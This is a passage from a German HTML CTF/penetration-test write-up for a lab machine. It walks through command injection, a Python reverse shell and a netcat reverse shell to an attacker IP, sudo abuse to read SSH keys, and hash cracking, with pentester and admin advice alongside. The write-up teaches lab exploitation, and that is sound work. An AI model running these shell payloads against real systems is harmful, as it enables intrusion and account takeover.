+Burp attacke:  http://192.168.2.107/sysadmin/system/?§cmd§=id
+Burp ergebnis: <span class="command">http://192.168.2.107/sysadmin/system/?mission=id</span>
+
+aber Burp braucht sehr lange...
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Notiz erklärt, dass ein erneuter Versuch mit Burp Suite erfolgreich war.
+                *   Burp wurde verwendet, um verschiedene Parameter (repräsentiert durch `§cmd§`, eine Burp-Payload-Markierung) zu testen, wahrscheinlich mit der gleichen Wortliste wie zuvor.
+                *   Der erfolgreiche Parameter für die Command Injection wurde als `mission` identifiziert.
+                *   Die URL `http://192.168.2.107/sysadmin/system/?mission=id` führt den `id`-Befehl auf dem Server aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Eine Command Injection Schwachstelle wurde im Admin-Bereich über den Parameter `mission` gefunden. Dies ermöglicht die Ausführung beliebiger Befehle als der Benutzer, unter dem der Webserver läuft (wahrscheinlich `www-data`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `mission`-Parameter-Schwachstelle, um eine Reverse Shell zu bekommen und den initialen Zugriff zu erlangen.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection Schwachstelle dringend! Validieren und bereinigen (sanitizen) Sie alle Benutzereingaben, insbesondere solche, die an Systembefehle übergeben werden. Verwenden Sie nach Möglichkeit keine `system()`- oder `exec()`-Aufrufe mit Benutzereingaben. Nutzen Sie sicherere Alternativen oder Whitelisting erlaubter Befehle/Parameter.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+             reverse shell Connection
+
+reverseShell = http://sedem.vm/sysadmin/system/?mission=<span class="command">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.140",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird der Payload für eine Python-Reverse-Shell vorbereitet, der über die gefundene `mission`-Parameter-Schwachstelle ausgeführt werden soll.
+                *   `import socket,subprocess,os`: Importiert notwendige Module.
+                *   `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)`: Erstellt ein TCP-Socket-Objekt.
+                *   `s.connect(("192.168.2.140",4444))`: Verbindet sich zur Angreifer-IP `192.168.2.140` auf Port `4444`.
+                *   `os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);`: Leitet Standardeingabe (0), Standardausgabe (1) und Standardfehler (2) des Prozesses auf den Netzwerk-Socket um.
+                *   `import pty; pty.spawn("/bin/sh")`: Startet eine interaktive `/bin/sh`-Shell innerhalb eines Pseudo-Terminals (PTY), die über den Socket gesteuert wird.
+            Die gesamte Payload wird als Wert für den `mission`-Parameter an die URL angehängt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein gängiger und effektiver Python-Payload für eine stabilisierte Reverse Shell. Er kombiniert die Netzwerkverbindung, die Umleitung der Standardströme und die PTY-Erzeugung in einem Einzeiler.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Ihrer Maschine (`192.168.2.140`) auf Port `4444`. Rufen Sie dann die konstruierte URL (URL-kodiert!) im Browser auf oder senden Sie sie mit `curl` ab.<br/><strong>Empfehlung (Admin):</strong> Verhindern Sie Command Injection (siehe vorherige Empfehlung). Blockieren Sie ausgehende Verbindungen vom Webserver (Egress Filtering).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.107] 41050</span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt">$</span> </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf der Angreifer-Maschine empfängt die eingehende Verbindung vom Ziel (`192.168.2.107`). Die Meldung "/bin/sh: 0: can't access tty; job control turned off" ist typisch für Shells, die ohne vollständiges Terminal gestartet werden (obwohl der Python-Payload `pty.spawn` verwendet hat, ist die initiale `nc`-Shell oft noch rudimentär). Der resultierende Prompt `$` zeigt an, dass eine Shell erhalten wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Sehr gut!** Initialer Zugriff auf das System als der Benutzer, unter dem der Webserver läuft (implizit `www-data`, siehe nächster Prompt), wurde durch die Command Injection und die Reverse Shell erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `id` oder `whoami` aus, um den Benutzer zu bestätigen. Stabilisieren Sie die Shell weiter, falls nötig (z.B. mit `python3 -c 'import pty;pty.spawn("/bin/bash")'` falls Python 3 verfügbar ist, oder `script /dev/null -c bash`). Beginnen Sie mit der Enumeration für die Privilegienausweitung.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection Schwachstelle. Analysieren Sie die Aktivitäten des kompromittierten Benutzers. Implementieren Sie Egress Filtering.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@sedem:/var/www/html/sysadmin/system$</span> <!-- Prompt hinzugefügt basierend auf Kontext --> </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der nächste Prompt (hier zur Verdeutlichung hinzugefügt, da im Original $ stand) bestätigt, dass der Benutzer `www-data` ist und sich im Verzeichnis `/var/www/html/sysadmin/system` befindet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Benutzer und Ausgangspunkt für die nächste Phase sind klar.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Text erwähnt `pppdump index.php`, was keinen Sinn ergibt. `pppdump` ist normalerweise ein Tool zum Extrahieren von Informationen aus PPP-Konfigurationsdateien oder -Prozessen. Es ist unklar, was hier versucht wurde. Vermutlich ein Tippfehler oder eine Verwechslung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl wird ignoriert, da er wahrscheinlich fehlerhaft ist.</p>
+
+            <h3>Shell-Stabilisierung</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                     <pre><span class="prompt">www-data@sedem:/var/www/html/sysadmin/system$</span> </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Shell wird mit dem bekannten Python3-PTY-Trick auf eine Bash-Shell aufgewertet, um eine bessere Interaktivität zu ermöglichen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardverfahren zur Verbesserung der Shell-Benutzbarkeit.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@sedem:/var/www/html/sysadmin/system$ <span class="command">export TERM=xterm</span></div>
+                     <pre><span class="prompt">www-data@sedem:/var/www/html/sysadmin/system$</span> </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die `TERM`-Variable wird gesetzt, um die Kompatibilität mit interaktiven Programmen wie `less`, `vi` etc. zu verbessern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Teil der Shell-Stabilisierung.</p>
+
+        </section>
+
+        <section id="privilege-escalation-user1">
+            <h2>Privilege Escalation (User1)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@sedem:/var/www/html/sysadmin/system$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for www-data on sedem:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on sedem:
+    <span class="command">(user1) NOPASSWD: /usr/sbin/pppdump</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt, dass der `www-data`-Benutzer den Befehl `/usr/sbin/pppdump` als `user1` ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Vektor zur Privilegieneskalation von `www-data` zu `user1`. `pppdump` ist ein ungewöhnliches Programm für eine `sudo`-Regel und könnte missbraucht werden, um Dateien zu lesen, auf die `www-data` normalerweise keinen Zugriff hat, die aber für `user1` lesbar sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie die Funktionsweise von `pppdump`. Prüfen Sie, ob es eine Option gibt, beliebige Dateien zu lesen oder Befehle auszuführen. Da `pppdump` oft mit PPP-Konfigurationen arbeitet, die sensible Daten enthalten können, versuchen Sie, damit auf interessante Dateien im Home-Verzeichnis von `user1` zuzugreifen, insbesondere auf SSH-Schlüssel (`/home/user1/.ssh/id_rsa`).<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie diese `sudo`-Regel. Ist es wirklich notwendig, dass `www-data` `pppdump` als `user1` ausführen kann? Wenn ja, stellen Sie sicher, dass `pppdump` keine Dateilese- oder Ausführungsfunktionen bietet, die missbraucht werden können. Gewähren Sie `sudo`-Rechte so restriktiv wie möglich.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, `pppdump` zu nutzen, um den privaten und öffentlichen SSH-Schlüssel von `user1` zu lesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@sedem:/home$ <span class="command">sudo -u user1 /usr/sbin/pppdump /home/user1/.ssh/id_rsa</span></div>
+                     <pre><span class="prompt">www-data@sedem:/home$</span> <!-- Keine direkte Ausgabe, pppdump schreibt evtl. woanders hin oder gibt Hex aus --> </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@sedem:/home$ <span class="command">sudo -u user1 /usr/sbin/pppdump /home/user1/.ssh/id_rsa.pub</span></div>
+                     <pre><span class="prompt">www-data@sedem:/home$</span> <!-- Keine direkte Ausgabe --> </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Befehle werden ausgeführt, um `pppdump` als `user1` zu starten und auf die SSH-Schlüsseldateien anzuwenden. Es gibt keine direkte Ausgabe auf die Konsole. Die Notiz im Originaltext besagt jedoch: "beide dateien sind in hex". Dies deutet darauf hin, dass `pppdump` in dieser Konfiguration den Inhalt der Zieldateien als Hexadezimal-Dump ausgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Ausnutzung der `sudo`-Regel! Obwohl der Mechanismus ungewöhnlich ist, konnten die Inhalte der SSH-Schlüssel von `user1` (wenn auch in Hex-Form) extrahiert werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie die Hex-Ausgaben (die hier nicht gezeigt, aber im Originalbericht erwähnt wurden). Verwenden Sie ein Tool wie CyberChef oder einen Skript, um den Hex-Code zurück in die ursprünglichen Schlüsseldateien (`id_rsa` und `id_rsa.pub`) zu konvertieren. Speichern Sie den privaten Schlüssel (`id_rsa`) lokal und versuchen Sie, sich damit per SSH als `user1` anzumelden.<br/><strong>Empfehlung (Admin):</strong> Entfernen oder korrigieren Sie die unsichere `sudo`-Regel für `pppdump`. Schützen Sie SSH-Schlüssel mit starken Passphrasen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Die folgenden Schritte beschreiben die Dekodierung und Verwendung des extrahierten SSH-Schlüssels.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+~
+beide dateien sind in hex, im https://icyberchef.com/#recipe=From_Hex('Auto') ...
+from hex , filter auto und umwandeln, vom id_rsa.pub die user1@sedem adresse in
+der /etc/host "sedem" eintragen
+dann einlogen...
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Notiz bestätigt, dass die Hex-Dumps mit CyberChef ("From Hex"-Operation) dekodiert wurden, um die originalen SSH-Schlüsseldateien wiederherzustellen. Es wird auch erwähnt, dass der Hostname `sedem` (aus dem Public Key `user1@sedem`) lokal in `/etc/hosts` eingetragen werden sollte, um die Verbindung zu erleichtern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrektes Vorgehen zur Wiederherstellung und Vorbereitung der Verwendung des Schlüssels.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i id_benni user1@sedem</span></div>
+                     <pre><!-- SSH Login-Ausgabe hier nicht vollständig gezeigt, aber Erfolg wird impliziert --> </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer versucht nun, sich von seiner Maschine aus per SSH als `user1` am Zielsystem `sedem` anzumelden. Er verwendet den wiederhergestellten privaten Schlüssel, der lokal als `id_benni` gespeichert wurde (`-i id_benni`). Der erfolgreiche Login wird durch die nachfolgenden Befehle als `user1@sedem` impliziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Die Privilegien wurden von `www-data` zu `user1` über die `sudo/pppdump`-Schwachstelle und den extrahierten SSH-Schlüssel eskaliert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie die Enumeration als `user1`. Überprüfen Sie `sudo -l` für `user1`, suchen Sie nach weiteren Schlüsseln, Passwörtern oder ausnutzbaren Konfigurationen.<br/><strong>Empfehlung (Admin):</strong> Entfernen Sie die `sudo`-Regel. Invalidieren Sie das kompromittierte SSH-Schlüsselpaar von `user1` und generieren Sie ein neues (mit Passphrase!).</p>
+        </section>
+
+        <section id="privilege-escalation-user2">
+            <h2>Privilege Escalation (User2)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `user1` wird nun nach Wegen gesucht, um weitere Rechte zu erlangen, vermutlich zum Benutzer `user2`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">user1@sedem:~$</span> <span class="command">sudo -u user2 /usr/bin/python /home/user2/socket/code.py</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl deutet darauf hin, dass `user1` (ähnlich wie zuvor `www-data`) eine `sudo`-Regel hat, die es erlaubt, ein Python-Skript (`/home/user2/socket/code.py`) als `user2` auszuführen (wahrscheinlich ohne Passwort, obwohl `sudo -l` für `user1` nicht gezeigt wurde). Das Skript selbst wird hier nur ausgeführt, aber nicht analysiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der nächste Vektor für die Privilegienausweitung. Das Skript `/home/user2/socket/code.py` muss untersucht werden. Es scheint mit Sockets zu arbeiten (basierend auf dem Pfad).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie das Skript `/home/user2/socket/code.py`. Suchen Sie nach Möglichkeiten, Befehle einzuschleusen oder die Socket-Kommunikation auszunutzen. Prüfen Sie, ob das Skript einen UNIX-Socket erstellt oder sich mit einem verbindet.<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `sudo`-Regel für `user1`. Ist es notwendig, dass `user1` dieses Skript als `user2` ausführen kann? Wenn ja, stellen Sie sicher, dass das Skript sicher ist und keine Schwachstellen enthält.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Die folgenden Befehle zeigen eine Methode, diese `sudo`-Regel über einen UNIX-Socket auszunutzen, der vermutlich von `code.py` erstellt oder verwendet wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">user1@sedem:~$</span> <span class="command">echo 'nc 192.168.2.140 3333 -e "/bin/bash"' | socat - UNIX-CLIENT:/home/user2/socket/socket_test.s</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+   └─# <span class="command">nc -lvvp 3333</span></div>
+                     <pre>listening on [any] 3333 ... </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong>
+                1. Auf der Angreifer-Maschine wird ein Netcat-Listener auf Port 3333 gestartet (`nc -lvvp 3333`).
+                2. Auf dem Zielsystem (`user1@sedem`) wird der Befehl `echo 'nc 192.168.2.140 3333 -e "/bin/bash"'` ausgeführt. Dieser gibt den String für eine Netcat-Reverse-Shell aus.
+                3. Die Ausgabe dieses `echo`-Befehls wird an `socat` weitergeleitet (`|`).
+                4. `socat - UNIX-CLIENT:/home/user2/socket/socket_test.s` nimmt die Standardeingabe (`-`) und sendet sie an einen UNIX-Domain-Socket unter dem Pfad `/home/user2/socket/socket_test.s`.
+             Die Annahme ist, dass das Python-Skript `/home/user2/socket/code.py` (das als `user2` läuft) auf diesem UNIX-Socket lauscht, die empfangenen Daten (den Reverse-Shell-Befehl) entgegennimmt und ausführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine clevere Methode, die `sudo`-Regel auszunutzen, indem Daten über einen UNIX-Socket an den privilegierten Prozess (`code.py` als `user2`) gesendet werden, der diese dann ausführt. Der Erfolg hängt davon ab, dass `code.py` tatsächlich auf diesem Socket lauscht und die empfangenen Daten unsicher verarbeitet (z.B. direkt an `os.system` übergibt).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der Listener läuft, bevor Sie den `socat`-Befehl ausführen. Überprüfen Sie den Listener auf eine eingehende Verbindung.<br/><strong>Empfehlung (Admin):</strong> Untersuchen Sie den Code von `/home/user2/socket/code.py` und beheben Sie die unsichere Verarbeitung von Daten, die über den UNIX-Socket empfangen werden. Überprüfen Sie die Notwendigkeit der `sudo`-Regel. Beschränken Sie die Berechtigungen für UNIX-Sockets, wenn möglich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+   └─# <span class="command">nc -lvvp 3333</span></div>
+                      <pre>
+listening on [any] 3333 ...
+<span class="password">connect to [192.168.2.140] from sedem.hmv [192.168.2.107] 42864</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener des Angreifers zeigt die erfolgreiche eingehende Verbindung. Dies bestätigt, dass der Reverse-Shell-Befehl erfolgreich über den UNIX-Socket an den als `user2` laufenden Prozess gesendet und von diesem ausgeführt wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Die Privilegien wurden von `user1` zu `user2` über die `sudo`-Regel und die Ausnutzung des UNIX-Sockets eskaliert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben nun eine Shell als `user2`. Stabilisieren Sie diese und beginnen Sie die Enumeration als `user2`.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstelle im Python-Skript und/oder die `sudo`-Regel.</p>
+
+        </section>
+
+        <section id="privilege-escalation-user3">
+            <h2>Privilege Escalation (User3)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `user2` wird weiter nach Möglichkeiten zur Privilegienerweiterung oder nach Flags gesucht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">user2@sedem:~$</span> <span class="command">find / -name *.txt 2>/dev/null</span></pre>
+                    <pre>
+<span class="command">/srv/ftp/user.txt</span>
+<span class="command">/home/user3/TD.txt</span>
+<span class="command">/home/user3/.privacy.txt</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine Suche nach `.txt`-Dateien im gesamten System wird durchgeführt. Es werden drei interessante Dateien gefunden:
+                * `/srv/ftp/user.txt`: Könnte die User-Flag enthalten (oft in CTFs in ungewöhnlichen Orten platziert).
+                * `/home/user3/TD.txt`: Eine Datei im Home-Verzeichnis von `user3`.
+                * `/home/user3/.privacy.txt`: Eine versteckte Datei im Home-Verzeichnis von `user3`, der Name klingt vielversprechend.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gute Funde. Die Dateien in `/home/user3` deuten auf den nächsten Benutzer hin. `/srv/ftp/user.txt` sollte zuerst überprüft werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt aller drei Dateien.<br/><strong>Empfehlung (Admin):</strong> Speichern Sie sensible Informationen oder Flags nicht in einfach auffindbaren Textdateien. Beschränken Sie Berechtigungen, wo möglich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">user2@sedem:~$</span> <span class="command">cat /srv/ftp/user.txt</span></pre>
+                     <pre><span class="password">Hegumlam</span></pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/srv/ftp/user.txt` wird ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist die User-Flag: `<span class="password">Hegumlam</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die User-Flag.<br/><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zu Flags/sensiblen Dateien.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">user2@sedem:~$</span> <span class="command">cat /home/user3/.privacy.txt</span></pre>
+                      <pre><span class="password">651d1fcb18b7da23658c394fe9acc05135054b262422b131fbabe4f9def2e396095403da0225a45369ee3cf2b3be0c3733b6bc7d899e4531ba5ce7dc47be67ee</span></pre>
+                   </div>
+               </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/home/user3/.privacy.txt` wird angezeigt. Es handelt sich um einen langen hexadezimal aussehenden String.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist sehr wahrscheinlich ein Passwort-Hash. Die Länge und das Format könnten auf einen bestimmten Algorithmus hindeuten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den Hash. Versuchen Sie, ihn mit Online-Diensten (wie Crackstation) oder Offline-Tools (wie Hashcat oder John the Ripper) zu identifizieren und zu cracken.<br/><strong>Empfehlung (Admin):</strong> Speichern Sie keine Passwort-Hashes in Klartextdateien. Verwenden Sie stattdessen Standard-Authentifizierungsmechanismen (/etc/shadow) mit starken Hashing-Algorithmen und Salt.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+https://crackstation.net/
+
+Hash	                                                                  Type	         Result
+<span class="password">651d1fcb18b7da23658c394fe9acc05135054b262422b131fbabe4f9def2e396095403da0225a45369ee3cf2b3be0c3733b6bc7d899e4531ba5ce7dc47be67ee</span>	<span class="command">whirlpool</span>	 <span class="password">nopassword</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Notiz zeigt, dass der Hash bei Crackstation eingereicht wurde. Crackstation identifizierte den Hash als Whirlpool und fand das entsprechende Klartextpasswort: `<span class="password">nopassword</span>`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Ausgezeichnet!** Das Passwort für `user3` wurde erfolgreich aus dem Hash wiederhergestellt. Das Passwort selbst ist extrem schwach.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su user3` und dem Passwort `nopassword` anzumelden.<br/><strong>Empfehlung (Admin):</strong> Ändern Sie sofort das Passwort für `user3`. Erzwingen Sie Richtlinien für starke Passwörter. Überprüfen Sie, warum dieser Hash in einer Datei gespeichert wurde.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">user2@sedem:~$</span> <span class="command">su user3</span></pre>
+                      <pre>Password: <span class="password">nopassword</span>
+
+<span class="prompt">user3@sedem:/home/user2$</span> </pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Wechsel zum Benutzer `user3` mit dem gecrackten Passwort `nopassword` ist erfolgreich. Der neue Prompt lautet `user3@sedem:/home/user2$`. </p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Die Privilegien wurden von `user2` zu `user3` eskaliert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie die Enumeration als `user3`. Suchen Sie nach `sudo`-Rechten, SUID-Dateien, Cronjobs etc., die zur Root-Eskalation führen könnten.<br/><strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort von `user3` und setzen Sie Passwortrichtlinien durch.</p>
+
+        </section>
+
+        <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `user3` wird nun nach dem finalen Weg zu Root-Rechten gesucht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">user2@sedem:~$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></pre> <!-- Prompt ist falsch im Original, sollte user3 sein -->
+                    <pre>
+   <span class="command">133068     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span>
+   <span class="command">666652     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">667041    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign</span>
+   <span class="command">669558    156 -rwsr-xr-x   1 root     root         157192 Jan 20  2021 /usr/bin/sudo</span>
+   <span class="command">655395     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn</span>
+   <span class="command">655399     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd</span>
+   <span class="command">658926     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su</span>
+   <span class="command">659253     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount</span>
+   <span class="command">658779     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp</span>
+   <span class="command">655396     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh</span>
+   <span class="command">659251     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount</span>
+   <span class="command">655398     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird nach SUID-Dateien gesucht (`find / -type f -perm -4000 -ls 2>/dev/null`). SUID-Dateien werden immer mit den Rechten des Besitzers ausgeführt, unabhängig davon, wer sie startet. Wenn eine SUID-Datei `root` gehört, läuft sie als `root`. Die Liste zeigt viele Standard-SUID-Dateien (`sudo`, `passwd`, `su` etc.), die normalerweise sicher sind, wenn sie aktuell sind. Es gibt keine offensichtlich ungewöhnlichen oder veralteten SUID-Dateien in dieser Liste.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Standard-SUID-Dateien bieten auf den ersten Blick keinen einfachen Weg zur Eskalation (es sei denn, eine davon ist eine verwundbare Version, was hier nicht geprüft wird).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl hier keine einfache Ausnutzung ersichtlich ist, lohnt es sich immer, die Versionen der SUID-Programme zu prüfen und auf GTFOBins nach bekannten Exploits zu suchen. Untersuchen Sie andere Vektoren wie Cronjobs oder Dateiberechtigungen weiter.<br/><strong>Empfehlung (Admin):</strong> Reduzieren Sie die Anzahl der SUID-Binaries auf das absolute Minimum. Überprüfen Sie regelmäßig, ob benutzerdefinierte SUID-Dateien vorhanden sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">user3@sedem:/home/user2$</span> <span class="command">cd /opt</span></pre>
+                     <pre><span class="prompt">user3@sedem:/opt$</span> </pre>
+                  </div>
+              </div>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">user3@sedem:/opt$</span> <span class="command">ls -la</span></pre>
+                      <pre>
+drwxr-x---  2 root user3  4096 May  9  2021 .
+drwxr-xr-x 18 root root   4096 May  9  2021 ..
+-rwsr-sr-x  1 root root  16712 May  9  2021 <span class="command">check</span>   <-----
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Im Verzeichnis `/opt` wird eine Datei namens `check` gefunden. Die Berechtigungen `-rwsr-sr-x` sind sehr interessant:
+                  *   `rws`: Das SUID-Bit ist gesetzt, der Besitzer ist `root`. Die Datei wird also als `root` ausgeführt.
+                  *   `r-s`: Das SGID-Bit ist gesetzt, die Gruppe ist `root`. Die Datei wird auch mit der Gruppen-ID `root` ausgeführt.
+                  *   `r-x`: Andere Benutzer (wie `user3`) haben Lese- und Ausführrechte.
+              Das Verzeichnis `/opt` selbst (`drwxr-x---`) gehört `root` und der Gruppe `user3`, wobei `user3` Lese- und Ausführrechte für das Verzeichnis hat.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Ein sehr vielversprechender Fund!** Eine SUID/SGID-Root-Datei in `/opt`, die von `user3` ausgeführt werden kann, ist ein klassischer Vektor für Privilegienausweitung. Das Verhalten dieser `check`-Datei muss analysiert werden.</p>
